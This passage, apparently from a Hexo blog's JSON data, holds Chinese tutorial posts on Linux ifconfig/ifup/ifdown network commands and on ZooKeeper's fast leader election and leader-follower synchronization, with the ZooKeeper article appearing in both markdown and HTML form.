Bcast, Mask 分别代表的是 Broadcast 与 netmask 喔！\ninet6 addr：是 IPv6 的版本的 IP ，我们没有使用，所以略过；\nMTU：就是第二章谈到的 MTU 啊！\nRX：那一行代表的是网络由启动到目前为止的封包接收情况， packets 代表封包数、errors 代表封包发生错误的数量、 dropped 代表封包由于有问题而遭丢弃的数量等等\nTX：与 RX 相反，为网络由启动到目前为止的传送情况；\ncollisions：代表封包碰撞的情况，如果发生太多次， 表示你的网络状况不太好；\ntxqueuelen：代表用来传输数据的缓冲区的储存长度；\nRX bytes, TX bytes：总接收、发送字节总量\n\n透过观察上述的资料，大致上可以了解到你的网络情况，尤其是那个RX, TX 内的 error 数量，以及是否发生严重的collision 情况，都是需要注意的喔！\n临时修改网络参数：ifconfig eth0 192.168.1.217 netmask 255.255.255.0 broadcast 192.168.1.255\n启动、关闭网卡：ifconfig eth0 up/down\n查看DNS地址：cat /etc/resolv.conf\n重启网络服务：/etc/init.d/network restart\n</code></pre><p> <strong>ifup、ifdown</strong></p>\n<pre><code>ifup   {interface}\nifdown {interface}\n这2个程序主要是搜寻/etc/sysconfig/network-scripts目录下的配置文件 (ifcfg-ethx) 来进行启动与关闭的， 所以在使用前请确定 ifcfg-ethx 是否真的存在于正确的目录内，否则会启动失败喔！ 另外，如果以 ifconfig eth0 .... 来设定或者是修改了网络接口后， 那就无法再以 ifdown eth0 的方式来关闭了！因为 ifdown 会分析比对目前的网络参数与ifcfg-eth0 是否相符，不符的话，就会放弃该次动作。因此，使用 ifconfig 修改完毕后，应该要以 ifconfig eth0 down 才能够关闭该接口喔。\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><strong>ifconfig</strong></p>\n<pre><code>ifconfig 主要是可以手动的启动、观察与修改网络接口的相关参数，可以修改的参数很多，包括 IP 参数以及 MTU 等等都可以修改.对应的配置文件为/etc/sysconfig/network-scripts/ifcfg-ethx\nifconfig {interface} {up|down}  &lt;== 观察与启动接口\nifconfig interface {options}    &lt;== 设定与修改接口\n选项与参数：\ninterface：网络卡接口代号，包括 eth0, eth1, ppp0 等等\noptions  ：可以接的参数，包括如下：\nup, down ：启动 (up) 或关闭 (down) 该网络接口(不涉及任何参数)\nmtu      ：可以设定不同的 MTU 数值，例如 mtu 1500 (单位为 byte)\nnetmask  ：就是子屏蔽网络；\nbroadcast：就是广播地址啊\n[root@redhat6 ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 08:00:27:4C:C5:88 \ninet addr:192.168.1.217  Bcast:192.168.1.255  Mask:255.255.255.0\ninet6 addr: fe80::a00:27ff:fe4c:c588/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:218811 errors:0 dropped:0 overruns:0 frame:0\nTX packets:85 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:14322456 (13.6 MiB)  TX bytes:11859 (11.5 KiB)\n</code></pre><p>上面出现的各项数据是这样的(数据排列由上而下、由左而右)：</p>\n<pre><code>eth0：就是网络卡的代号，也有 lo 这个 loopback ；\nHWaddr：就是网络卡的硬件地址，俗称的 MAC 是也；\ninet addr：IPv4 的 IP 地址，后续的 Bcast, Mask 分别代表的是 Broadcast 与 netmask 喔！\ninet6 addr：是 IPv6 的版本的 IP ，我们没有使用，所以略过；\nMTU：就是第二章谈到的 MTU 啊！\nRX：那一行代表的是网络由启动到目前为止的封包接收情况， packets 代表封包数、errors 代表封包发生错误的数量、 dropped 代表封包由于有问题而遭丢弃的数量等等\nTX：与 RX 相反，为网络由启动到目前为止的传送情况；\ncollisions：代表封包碰撞的情况，如果发生太多次， 表示你的网络状况不太好；\ntxqueuelen：代表用来传输数据的缓冲区的储存长度；\nRX bytes, TX bytes：总接收、发送字节总量\n\n透过观察上述的资料，大致上可以了解到你的网络情况，尤其是那个RX, TX 内的 error 数量，以及是否发生严重的collision 情况，都是需要注意的喔！\n临时修改网络参数：ifconfig eth0 192.168.1.217 netmask 255.255.255.0 broadcast 192.168.1.255\n启动、关闭网卡：ifconfig eth0 up/down\n查看DNS地址：cat /etc/resolv.conf\n重启网络服务：/etc/init.d/network restart\n</code></pre><p> <strong>ifup、ifdown</strong></p>\n<pre><code>ifup   {interface}\nifdown {interface}\n这2个程序主要是搜寻/etc/sysconfig/network-scripts目录下的配置文件 (ifcfg-ethx) 来进行启动与关闭的， 所以在使用前请确定 ifcfg-ethx 是否真的存在于正确的目录内，否则会启动失败喔！ 另外，如果以 ifconfig eth0 .... 来设定或者是修改了网络接口后， 那就无法再以 ifdown eth0 的方式来关闭了！因为 ifdown 会分析比对目前的网络参数与ifcfg-eth0 是否相符，不符的话，就会放弃该次动作。因此，使用 ifconfig 修改完毕后，应该要以 ifconfig eth0 down 才能够关闭该接口喔。\n</code></pre>"},{"title":"Zookeeper的领导者选举和原子广播","date":"2017-11-30T09:04:35.000Z","_content":"**目录：**\n\n1. 工作原理概述\n2. Fast Leader选举算法（领导者选举）\n3. Leader与Follower同步数据（原子广播）\n---\n#### 工作原理概述\nzookeeper3.3.3源码分析(一)工作原理概述\n阅读时参考的版本是3.3.3.\n\n&emsp;&emsp;简单的说一下zookeeper工作的过程,如果对这个过程还不太清楚,或者说对它如何使用等不太清楚的,可以参考一下其他的文章,比如这篇,这一系列的文章将不讲解它如何使用(实际上我也没有在具体项目中使用过,只是简单的配置运行起来大概晓得如何工作而已).\n\n&emsp;&emsp;zookeeper有两种工作的模式,一种是单机方式,另一种是集群方式.单机方式不属于这里分析的范畴,因为研究zookeeper的目的就在于研究一个zookeeper集群的机器如何协调起来工作的.\n\n&emsp;&emsp;要配置几台zookeeper一起工作,大家在开始必须使用相同的配置文件,配置文件中有一些配置项,但是与集群相关的是这一项:\n\nserver.1=192.168.211.1:2888:3888\nserver.2=192.168.211.2:2888:3888\n\n这里定义了两台服务器的配置,格式为:\n\nserver.serverid=serverhost:leader_listent_port:quorum_port\n\n&emsp;&emsp;顾名思义,serverid是本服务器的id,leader_listen_port是该服务器一旦成为leader之后需要监听的端口,用于接收来自follower的请求,quorum_port是集群中的每一个服务器在最开始选举leader时监听的端口,用于服务器互相之间通信选举leader.\n\n&emsp;&emsp;需要注意的是,server id并没有写在这个配置文件中,而是在datadir中的myid文件中指定,我理解这么做的目的是:所有的服务器统一使用一个配置文件,该配置文件里面没有任何与特定服务器相关的信息,这样便于发布服务的时候不会出错,而独立出来一个文件专门存放这个server id值.\n\nzookeeper集群工作的过程包括如下几步:\n1) recovery,这个过程泛指集群服务器的启动和恢复,因为恢复也可以理解为另一种层面上的”启动”–需要恢复历史数据的启动,后面会详细讲解.\n2) broadcast,这是启动完毕之后,集群中的服务器开始接收客户端的连接一起工作的过程,如果客户端有修改数据的改动,那么一定会由leader广播给follower,所以称为”broadcast”.\n\n展开来说,zookeeper集群大概是这样工作的:\n&emsp;&emsp;1) 首先每个服务器读取配置文件和数据文件,根据serverid知道本机对应的配置(就是前面那些地址和端口),并且将历史数据加载进内存中.\n&emsp;&emsp;2) 集群中的服务器开始根据前面给出的quorum port监听集群中其他服务器的请求,并且把自己选举的leader也通知其他服务器,来来往往几回,选举出集群的一个leader.\n&emsp;&emsp;3) 选举完leader其实还不算是真正意义上的”leader”,因为到了这里leader还需要与集群中的其他服务器同步数据,如果这一步出错,将返回2)中重新选举leader.在leader选举完毕之后,集群中的其他服务器称为”follower”,也就是都要听从leader的指令.\n&emsp;&emsp;4) 到了这里,集群中的所有服务器,不论是leader还是follower,大家的数据都是一致的了,可以开始接收客户端的连接了.如果是读类型的请求,那么直接返回就是了,因为并不改变数据;否则,都要向leader汇报,如何通知leader呢?就是通过前面讲到的leader_listen_port.leader收到这个修改数据的请求之后,将会广播给集群中其他follower,当超过一半数量的follower有了回复,那么就相当于这个修改操作哦了,这时leader可以告诉之前的那台服务器可以给客户端一个回应了.\n\n可以看到,上面1),2),3)对应的recovery过程,而4)对应的broadcast过程.这里只是简单的描述了一下zookeeper集群的工作原理,后面将分别展开来讨论.\n\n#### Fast Leader选举算法（领导者选举）\n&emsp;&emsp;如何在zookeeper集群中选举出一个leader,zookeeper使用了三种算法,具体使用哪种算法,在配置文件中是可以配置的,对应的配置项是”electionAlg”,其中1对应的是LeaderElection算法,2对应的是AuthFastLeaderElection算法,3对应的是FastLeaderElection算法.默认使用FastLeaderElection算法.其他两种算法我没有研究过,就不多说了.\n\n要理解这个算法,最好需要一些paxos算法的理论基础.\n\n1) 数据恢复阶段\n首先,每个在zookeeper服务器先读取当前保存在磁盘的数据,zookeeper中的每份数据,都有一个对应的id值,这个值是依次递增的,换言之,越新的数据,对应的ID值就越大.\n\n2) 向其他节点发送投票值\n在读取数据完毕之后,每个zookeeper服务器发送自己选举的leader（首次选自己）,这个协议中包含了以下几部分的数据:\n\n    a)所选举leader的id(就是配置文件中写好的每个服务器的id) ,在初始阶段,每台服务器的这个值都是自己服务器的id,也就是它们都选举自己为leader.\n    b) 服务器最大数据的id,这个值大的服务器,说明存放了更新的数据.\n    c)逻辑时钟的值,这个值从0开始递增,每次选举对应一个值,也就是说:  如果在同一次选举中,那么这个值应该是一致的 ;  逻辑时钟值越大,说明这一次选举leader的进程更新.\n    d) 本机在当前选举过程中的状态,有以下几种:LOOKING,FOLLOWING,OBSERVING,LEADING,顾名思义不必解释了吧.\n\n3）接受来自其他节点的数据\n&emsp;&emsp;每台服务器将自己服务器的以上数据发送到集群中的其他服务器之后,同样的也需要接收来自其他服务器的数据,它将做以下的处理:\n（1）如果所接收数据中服务器的状态还是在选举阶段(LOOKING 状态),那么首先判断逻辑时钟值,又分为以下三种情况:\n\n     a) 如果发送过来的逻辑时钟大于目前的逻辑时钟,那么说明这是更新的一次选举,此时需要更新一下本机的逻辑时钟值,同时将之前收集到的来自其他服务器的选举清空,因为这些数据已经不再有效了.然后判断是否需要更新当前自己的选举情况.在这里是根据选举leader id,保存的最大数据id来进行判断的,这两种数据之间对这个选举结果的影响的权重关系是:首先看数据id,数据id大者胜出;其次再判断leader id,leader id大者胜出.然后再将自身最新的选举结果(也就是上面提到的三种数据）广播给其他服务器).\n    b) 发送过来数据的逻辑时钟小于本机的逻辑时钟，说明对方在一个相对较早的选举进程中,这里只需要将本机的数据发送过去就是了\n    c) 两边的逻辑时钟相同,此时也只是调用totalOrderPredicate函数判断是否需要更新本机的数据,如果更新了再将自己最新的选举结果广播出去就是了.\n\n然后再处理两种情况:\n&emsp;&emsp;1)服务器判断是不是已经收集到了所有服务器的选举状态,如果是，那么这台服务器选举的leader就定下来了，然后根据选举结果设置自己的角色(FOLLOWING还是LEADER),然后退出选举过程就是了.\n&emsp;&emsp;2)即使没有收集到所有服务器的选举状态,也可以根据该节点上选择的最新的leader是不是得到了超过半数以上服务器的支持,如果是,那么当前线程将被阻塞等待一段时间(这个时间在finalizeWait定义)看看是不是还会收到当前leader的数据更优的leader,如果经过一段时间还没有这个新的leader提出来，那么这台服务器最终的leader就确定了,否则进行下一次选举. \n\n（2) 如果所接收服务器不在选举状态,也就是在FOLLOWING或者LEADING状态\n\n做以下两个判断:\n&emsp;&emsp;a) 如果逻辑时钟相同,将该数据保存到recvset,如果所接收服务器宣称自己是leader,那么将判断是不是有半数以上的服务器选举它,如果是则设置选举状态退出选举过程\n&emsp;&emsp;b) 否则这是一条与当前逻辑时钟不符合的消息,那么说明在另一个选举过程中已经有了选举结果,于是将该选举结果加入到outofelection集合中,再根据outofelection来判断是否可以结束选举,如果可以也是保存逻辑时钟,设置选举状态,退出选举过程.\n代码如下:\n\n\n以一个简单的例子来说明整个选举的过程.\n假设有五台服务器组成的zookeeper集群,它们的id从1-5,同时它们都是最新启动的,也就是没有历史数据,在存放数据量这一点上,都是一样的.假设这些服务器依序启动,来看看会发生什么.\n&emsp;&emsp;1) 服务器1启动,此时只有它一台服务器启动了,它发出去的报没有任何响应,所以它的选举状态一直是LOOKING状态\n&emsp;&emsp;2) 服务器2启动,它与最开始启动的服务器1进行通信,互相交换自己的选举结果,由于两者都没有历史数据,所以id值较大的服务器2胜出,但是由于没有达到超过半数以上的服务器都同意选举它(这个例子中的半数以上是3),所以服务器1,2还是继续保持LOOKING状态.\n&emsp;&emsp;3) 服务器3启动,根据前面的理论分析,服务器3成为服务器1,2,3中的老大,而与上面不同的是,此时有三台服务器选举了它,所以它成为了这次选举的leader.\n&emsp;&emsp;4) 服务器4启动,根据前面的分析,理论上服务器4应该是服务器1,2,3,4中最大的,但是由于前面已经有半数以上的服务器选举了服务器3,所以它只能接收当小弟的命了.\n&emsp;&emsp;5) 服务器5启动,同4一样,当小弟.\n\n&emsp;&emsp;以上就是fastleader算法的简要分析,还有一些异常情况的处理,比如某台服务器宕机之后的处理,当leader宕机之后的处理等等,后面再谈.\n\n \n\n#### Leader与Follower同步数据（原子广播）\n&emsp;&emsp;根据 Fast Leader选举算法中的分析,如果一台zookeeper服务器成为集群中的leader,那么一定是当前所有服务器中保存数据最多（不是最新？？）的服务器,所以在这台服务器成为leader之后,首先要做的事情就是与集群中的其它服务器(现在是follower)同步数据,保证大家的数据一致,这个过程完毕了才开始正式处理来自客户端的连接请求.\n\n&emsp;&emsp;Fast Leader选举算法中提到的同步数据时使用的逻辑时钟,它的初始值是0,每次选举过程都会递增的,在leader正式上任之后做的第一件事情,就是根据当前保存的数据id值,设置最新的逻辑时钟值。\n\n&emsp;&emsp;随后,leader构建NEWLEADER封包,该封包的数据是当前最大数据的id,广播给所有的follower,也就是告知follower leader保存的数据id是多少,大家看看是不是需要同步。然后,leader根据follower数量给每个follower创建一个线程LearnerHandler,专门负责接收它们的同步数据请求.leader主线程开始阻塞在这里,等待其他follower的回应(也就是LearnerHandler线程的处理结果),同样的,只有在超过半数的follower已经同步数据完毕,这个过程才能结束,leader才能正式成为leader.\n\n**leader所做的工作：**\n\n&emsp;&emsp;所以其实leader与follower同步数据的大部分操作都在LearnerHandler线程中处理的,接着看这一块.\nleader接收到的来自某个follower封包一定是FOLLOWERINFO,该封包告知了该服务器保存的数据id.之后根据这个数据id与本机保存的数据进行比较:\n&emsp;&emsp;1) 如果数据完全一致,则发送DIFF封包告知follower当前数据就是最新的了.\n&emsp;&emsp;2) 判断这一阶段之内有没有已经被提交的提议值,如果有,那么:\n&emsp;&emsp;&emsp;&emsp;a) 如果有部分数据没有同步,那么会发送DIFF封包将有差异的数据同步过去.同时将follower没有的数据逐个发送COMMIT封包给follower要求记录下来.\n&emsp;&emsp;&emsp;&emsp;b) 如果follower数据id更大,那么会发送TRUNC封包告知截除多余数据.（一台leader数据没同步就宕掉了，选举之后恢复了，数据比现在leader更新）\n&emsp;&emsp;3) 如果这一阶段内没有提交的提议值,直接发送SNAP封包将快照同步发送给follower.\n&emsp;&emsp;4）消息完毕之后,发送UPTODATE封包告知follower当前数据就是最新的了,再次发送NEWLEADER封包宣称自己是leader,等待follower的响应.\n\n**follower做的工作：**\n（1）会尝试与leader建立连接,这里有一个机制,如果一定时间内没有连接上,就报错退出,重新回到选举状态.\n（2）其次在发送FOLLOWERINFO封包,该封包中带上自己的最大数据id,也就是会告知leader本机保存的最大数据id.\n（3）根据前面对LeaderHandler的分析,leader会根据不同的情况发送DIFF,UPTODATE,TRUNC,SNAP,依次进行处理就是了,此时follower跟leader的数据也就同步上了.\n（4）由于leader端发送的最后一个封包是UPTODATE,因此在接收到这个封包之后follower结束同步数据过程,发送ACK封包回复leader.\n\n以上过程中,任何情况出现的错误,服务器将自动将选举状态切换到LOOKING状态,重新开始进行选举.","source":"_posts/Zookeeper的领导者选举和原子广播.md","raw":"---\ntitle: Zookeeper的领导者选举和原子广播\ndate: 2017-11-30 17:04:35\ntags: Zookeeper\n---\n**目录：**\n\n1. 工作原理概述\n2. Fast Leader选举算法（领导者选举）\n3. Leader与Follower同步数据（原子广播）\n---\n#### 工作原理概述\nzookeeper3.3.3源码分析(一)工作原理概述\n阅读时参考的版本是3.3.3.\n\n&emsp;&emsp;简单的说一下zookeeper工作的过程,如果对这个过程还不太清楚,或者说对它如何使用等不太清楚的,可以参考一下其他的文章,比如这篇,这一系列的文章将不讲解它如何使用(实际上我也没有在具体项目中使用过,只是简单的配置运行起来大概晓得如何工作而已).\n\n&emsp;&emsp;zookeeper有两种工作的模式,一种是单机方式,另一种是集群方式.单机方式不属于这里分析的范畴,因为研究zookeeper的目的就在于研究一个zookeeper集群的机器如何协调起来工作的.\n\n&emsp;&emsp;要配置几台zookeeper一起工作,大家在开始必须使用相同的配置文件,配置文件中有一些配置项,但是与集群相关的是这一项:\n\nserver.1=192.168.211.1:2888:3888\nserver.2=192.168.211.2:2888:3888\n\n这里定义了两台服务器的配置,格式为:\n\nserver.serverid=serverhost:leader_listent_port:quorum_port\n\n&emsp;&emsp;顾名思义,serverid是本服务器的id,leader_listen_port是该服务器一旦成为leader之后需要监听的端口,用于接收来自follower的请求,quorum_port是集群中的每一个服务器在最开始选举leader时监听的端口,用于服务器互相之间通信选举leader.\n\n&emsp;&emsp;需要注意的是,server id并没有写在这个配置文件中,而是在datadir中的myid文件中指定,我理解这么做的目的是:所有的服务器统一使用一个配置文件,该配置文件里面没有任何与特定服务器相关的信息,这样便于发布服务的时候不会出错,而独立出来一个文件专门存放这个server id值.\n\nzookeeper集群工作的过程包括如下几步:\n1) recovery,这个过程泛指集群服务器的启动和恢复,因为恢复也可以理解为另一种层面上的”启动”–需要恢复历史数据的启动,后面会详细讲解.\n2) broadcast,这是启动完毕之后,集群中的服务器开始接收客户端的连接一起工作的过程,如果客户端有修改数据的改动,那么一定会由leader广播给follower,所以称为”broadcast”.\n\n展开来说,zookeeper集群大概是这样工作的:\n&emsp;&emsp;1) 首先每个服务器读取配置文件和数据文件,根据serverid知道本机对应的配置(就是前面那些地址和端口),并且将历史数据加载进内存中.\n&emsp;&emsp;2) 集群中的服务器开始根据前面给出的quorum port监听集群中其他服务器的请求,并且把自己选举的leader也通知其他服务器,来来往往几回,选举出集群的一个leader.\n&emsp;&emsp;3) 选举完leader其实还不算是真正意义上的”leader”,因为到了这里leader还需要与集群中的其他服务器同步数据,如果这一步出错,将返回2)中重新选举leader.在leader选举完毕之后,集群中的其他服务器称为”follower”,也就是都要听从leader的指令.\n&emsp;&emsp;4) 到了这里,集群中的所有服务器,不论是leader还是follower,大家的数据都是一致的了,可以开始接收客户端的连接了.如果是读类型的请求,那么直接返回就是了,因为并不改变数据;否则,都要向leader汇报,如何通知leader呢?就是通过前面讲到的leader_listen_port.leader收到这个修改数据的请求之后,将会广播给集群中其他follower,当超过一半数量的follower有了回复,那么就相当于这个修改操作哦了,这时leader可以告诉之前的那台服务器可以给客户端一个回应了.\n\n可以看到,上面1),2),3)对应的recovery过程,而4)对应的broadcast过程.这里只是简单的描述了一下zookeeper集群的工作原理,后面将分别展开来讨论.\n\n#### Fast Leader选举算法（领导者选举）\n&emsp;&emsp;如何在zookeeper集群中选举出一个leader,zookeeper使用了三种算法,具体使用哪种算法,在配置文件中是可以配置的,对应的配置项是”electionAlg”,其中1对应的是LeaderElection算法,2对应的是AuthFastLeaderElection算法,3对应的是FastLeaderElection算法.默认使用FastLeaderElection算法.其他两种算法我没有研究过,就不多说了.\n\n要理解这个算法,最好需要一些paxos算法的理论基础.\n\n1) 数据恢复阶段\n首先,每个在zookeeper服务器先读取当前保存在磁盘的数据,zookeeper中的每份数据,都有一个对应的id值,这个值是依次递增的,换言之,越新的数据,对应的ID值就越大.\n\n2) 向其他节点发送投票值\n在读取数据完毕之后,每个zookeeper服务器发送自己选举的leader（首次选自己）,这个协议中包含了以下几部分的数据:\n\n    a)所选举leader的id(就是配置文件中写好的每个服务器的id) ,在初始阶段,每台服务器的这个值都是自己服务器的id,也就是它们都选举自己为leader.\n    b) 服务器最大数据的id,这个值大的服务器,说明存放了更新的数据.\n    c)逻辑时钟的值,这个值从0开始递增,每次选举对应一个值,也就是说:  如果在同一次选举中,那么这个值应该是一致的 ;  逻辑时钟值越大,说明这一次选举leader的进程更新.\n    d) 本机在当前选举过程中的状态,有以下几种:LOOKING,FOLLOWING,OBSERVING,LEADING,顾名思义不必解释了吧.\n\n3）接受来自其他节点的数据\n&emsp;&emsp;每台服务器将自己服务器的以上数据发送到集群中的其他服务器之后,同样的也需要接收来自其他服务器的数据,它将做以下的处理:\n（1）如果所接收数据中服务器的状态还是在选举阶段(LOOKING 状态),那么首先判断逻辑时钟值,又分为以下三种情况:\n\n     a) 如果发送过来的逻辑时钟大于目前的逻辑时钟,那么说明这是更新的一次选举,此时需要更新一下本机的逻辑时钟值,同时将之前收集到的来自其他服务器的选举清空,因为这些数据已经不再有效了.然后判断是否需要更新当前自己的选举情况.在这里是根据选举leader id,保存的最大数据id来进行判断的,这两种数据之间对这个选举结果的影响的权重关系是:首先看数据id,数据id大者胜出;其次再判断leader id,leader id大者胜出.然后再将自身最新的选举结果(也就是上面提到的三种数据）广播给其他服务器).\n    b) 发送过来数据的逻辑时钟小于本机的逻辑时钟，说明对方在一个相对较早的选举进程中,这里只需要将本机的数据发送过去就是了\n    c) 两边的逻辑时钟相同,此时也只是调用totalOrderPredicate函数判断是否需要更新本机的数据,如果更新了再将自己最新的选举结果广播出去就是了.\n\n然后再处理两种情况:\n&emsp;&emsp;1)服务器判断是不是已经收集到了所有服务器的选举状态,如果是，那么这台服务器选举的leader就定下来了，然后根据选举结果设置自己的角色(FOLLOWING还是LEADER),然后退出选举过程就是了.\n&emsp;&emsp;2)即使没有收集到所有服务器的选举状态,也可以根据该节点上选择的最新的leader是不是得到了超过半数以上服务器的支持,如果是,那么当前线程将被阻塞等待一段时间(这个时间在finalizeWait定义)看看是不是还会收到当前leader的数据更优的leader,如果经过一段时间还没有这个新的leader提出来，那么这台服务器最终的leader就确定了,否则进行下一次选举. \n\n（2) 如果所接收服务器不在选举状态,也就是在FOLLOWING或者LEADING状态\n\n做以下两个判断:\n&emsp;&emsp;a) 如果逻辑时钟相同,将该数据保存到recvset,如果所接收服务器宣称自己是leader,那么将判断是不是有半数以上的服务器选举它,如果是则设置选举状态退出选举过程\n&emsp;&emsp;b) 否则这是一条与当前逻辑时钟不符合的消息,那么说明在另一个选举过程中已经有了选举结果,于是将该选举结果加入到outofelection集合中,再根据outofelection来判断是否可以结束选举,如果可以也是保存逻辑时钟,设置选举状态,退出选举过程.\n代码如下:\n\n\n以一个简单的例子来说明整个选举的过程.\n假设有五台服务器组成的zookeeper集群,它们的id从1-5,同时它们都是最新启动的,也就是没有历史数据,在存放数据量这一点上,都是一样的.假设这些服务器依序启动,来看看会发生什么.\n&emsp;&emsp;1) 服务器1启动,此时只有它一台服务器启动了,它发出去的报没有任何响应,所以它的选举状态一直是LOOKING状态\n&emsp;&emsp;2) 服务器2启动,它与最开始启动的服务器1进行通信,互相交换自己的选举结果,由于两者都没有历史数据,所以id值较大的服务器2胜出,但是由于没有达到超过半数以上的服务器都同意选举它(这个例子中的半数以上是3),所以服务器1,2还是继续保持LOOKING状态.\n&emsp;&emsp;3) 服务器3启动,根据前面的理论分析,服务器3成为服务器1,2,3中的老大,而与上面不同的是,此时有三台服务器选举了它,所以它成为了这次选举的leader.\n&emsp;&emsp;4) 服务器4启动,根据前面的分析,理论上服务器4应该是服务器1,2,3,4中最大的,但是由于前面已经有半数以上的服务器选举了服务器3,所以它只能接收当小弟的命了.\n&emsp;&emsp;5) 服务器5启动,同4一样,当小弟.\n\n&emsp;&emsp;以上就是fastleader算法的简要分析,还有一些异常情况的处理,比如某台服务器宕机之后的处理,当leader宕机之后的处理等等,后面再谈.\n\n \n\n#### Leader与Follower同步数据（原子广播）\n&emsp;&emsp;根据 Fast Leader选举算法中的分析,如果一台zookeeper服务器成为集群中的leader,那么一定是当前所有服务器中保存数据最多（不是最新？？）的服务器,所以在这台服务器成为leader之后,首先要做的事情就是与集群中的其它服务器(现在是follower)同步数据,保证大家的数据一致,这个过程完毕了才开始正式处理来自客户端的连接请求.\n\n&emsp;&emsp;Fast Leader选举算法中提到的同步数据时使用的逻辑时钟,它的初始值是0,每次选举过程都会递增的,在leader正式上任之后做的第一件事情,就是根据当前保存的数据id值,设置最新的逻辑时钟值。\n\n&emsp;&emsp;随后,leader构建NEWLEADER封包,该封包的数据是当前最大数据的id,广播给所有的follower,也就是告知follower leader保存的数据id是多少,大家看看是不是需要同步。然后,leader根据follower数量给每个follower创建一个线程LearnerHandler,专门负责接收它们的同步数据请求.leader主线程开始阻塞在这里,等待其他follower的回应(也就是LearnerHandler线程的处理结果),同样的,只有在超过半数的follower已经同步数据完毕,这个过程才能结束,leader才能正式成为leader.\n\n**leader所做的工作：**\n\n&emsp;&emsp;所以其实leader与follower同步数据的大部分操作都在LearnerHandler线程中处理的,接着看这一块.\nleader接收到的来自某个follower封包一定是FOLLOWERINFO,该封包告知了该服务器保存的数据id.之后根据这个数据id与本机保存的数据进行比较:\n&emsp;&emsp;1) 如果数据完全一致,则发送DIFF封包告知follower当前数据就是最新的了.\n&emsp;&emsp;2) 判断这一阶段之内有没有已经被提交的提议值,如果有,那么:\n&emsp;&emsp;&emsp;&emsp;a) 如果有部分数据没有同步,那么会发送DIFF封包将有差异的数据同步过去.同时将follower没有的数据逐个发送COMMIT封包给follower要求记录下来.\n&emsp;&emsp;&emsp;&emsp;b) 如果follower数据id更大,那么会发送TRUNC封包告知截除多余数据.（一台leader数据没同步就宕掉了，选举之后恢复了，数据比现在leader更新）\n&emsp;&emsp;3) 如果这一阶段内没有提交的提议值,直接发送SNAP封包将快照同步发送给follower.\n&emsp;&emsp;4）消息完毕之后,发送UPTODATE封包告知follower当前数据就是最新的了,再次发送NEWLEADER封包宣称自己是leader,等待follower的响应.\n\n**follower做的工作：**\n（1）会尝试与leader建立连接,这里有一个机制,如果一定时间内没有连接上,就报错退出,重新回到选举状态.\n（2）其次在发送FOLLOWERINFO封包,该封包中带上自己的最大数据id,也就是会告知leader本机保存的最大数据id.\n（3）根据前面对LeaderHandler的分析,leader会根据不同的情况发送DIFF,UPTODATE,TRUNC,SNAP,依次进行处理就是了,此时follower跟leader的数据也就同步上了.\n（4）由于leader端发送的最后一个封包是UPTODATE,因此在接收到这个封包之后follower结束同步数据过程,发送ACK封包回复leader.\n\n以上过程中,任何情况出现的错误,服务器将自动将选举状态切换到LOOKING状态,重新开始进行选举.","slug":"Zookeeper的领导者选举和原子广播","published":1,"updated":"2018-01-30T09:19:02.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twr002lmfahg77abr8z","content":"<p><strong>目录：</strong></p>\n<ol>\n<li>工作原理概述</li>\n<li>Fast Leader选举算法（领导者选举）</li>\n<li>Leader与Follower同步数据（原子广播）</li>\n</ol>\n<hr>\n<h4 id=\"工作原理概述\"><a href=\"#工作原理概述\" class=\"headerlink\" title=\"工作原理概述\"></a>工作原理概述</h4><p>zookeeper3.3.3源码分析(一)工作原理概述<br>阅读时参考的版本是3.3.3.</p>\n<p>&emsp;&emsp;简单的说一下zookeeper工作的过程,如果对这个过程还不太清楚,或者说对它如何使用等不太清楚的,可以参考一下其他的文章,比如这篇,这一系列的文章将不讲解它如何使用(实际上我也没有在具体项目中使用过,只是简单的配置运行起来大概晓得如何工作而已).</p>\n<p>&emsp;&emsp;zookeeper有两种工作的模式,一种是单机方式,另一种是集群方式.单机方式不属于这里分析的范畴,因为研究zookeeper的目的就在于研究一个zookeeper集群的机器如何协调起来工作的.</p>\n<p>&emsp;&emsp;要配置几台zookeeper一起工作,大家在开始必须使用相同的配置文件,配置文件中有一些配置项,但是与集群相关的是这一项:</p>\n<p>server.1=192.168.211.1:2888:3888<br>server.2=192.168.211.2:2888:3888</p>\n<p>这里定义了两台服务器的配置,格式为:</p>\n<p>server.serverid=serverhost:leader_listent_port:quorum_port</p>\n<p>&emsp;&emsp;顾名思义,serverid是本服务器的id,leader_listen_port是该服务器一旦成为leader之后需要监听的端口,用于接收来自follower的请求,quorum_port是集群中的每一个服务器在最开始选举leader时监听的端口,用于服务器互相之间通信选举leader.</p>\n<p>&emsp;&emsp;需要注意的是,server id并没有写在这个配置文件中,而是在datadir中的myid文件中指定,我理解这么做的目的是:所有的服务器统一使用一个配置文件,该配置文件里面没有任何与特定服务器相关的信息,这样便于发布服务的时候不会出错,而独立出来一个文件专门存放这个server id值.</p>\n<p>zookeeper集群工作的过程包括如下几步:<br>1) recovery,这个过程泛指集群服务器的启动和恢复,因为恢复也可以理解为另一种层面上的”启动”–需要恢复历史数据的启动,后面会详细讲解.<br>2) broadcast,这是启动完毕之后,集群中的服务器开始接收客户端的连接一起工作的过程,如果客户端有修改数据的改动,那么一定会由leader广播给follower,所以称为”broadcast”.</p>\n<p>展开来说,zookeeper集群大概是这样工作的:<br>&emsp;&emsp;1) 首先每个服务器读取配置文件和数据文件,根据serverid知道本机对应的配置(就是前面那些地址和端口),并且将历史数据加载进内存中.<br>&emsp;&emsp;2) 集群中的服务器开始根据前面给出的quorum port监听集群中其他服务器的请求,并且把自己选举的leader也通知其他服务器,来来往往几回,选举出集群的一个leader.<br>&emsp;&emsp;3) 选举完leader其实还不算是真正意义上的”leader”,因为到了这里leader还需要与集群中的其他服务器同步数据,如果这一步出错,将返回2)中重新选举leader.在leader选举完毕之后,集群中的其他服务器称为”follower”,也就是都要听从leader的指令.<br>&emsp;&emsp;4) 